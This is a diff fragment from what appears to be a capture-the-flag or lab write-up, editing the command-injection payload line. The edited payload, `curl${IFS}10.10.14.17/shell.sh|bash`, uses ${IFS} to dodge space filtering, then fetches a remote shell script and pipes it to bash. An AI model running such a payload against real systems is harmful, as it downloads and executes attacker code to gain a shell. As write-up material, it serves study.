@@ -245,7 +245,7 @@ Now that we have the `file`, we run a `curl` again but `poiting` to the `shell.s
 
 <br />
 
-- Payload -> `curl${IFS}10.10.14.17|bash`
+- Payload -> `curl${IFS}10.10.14.17/shell.sh|bash`
 
 <br />
 
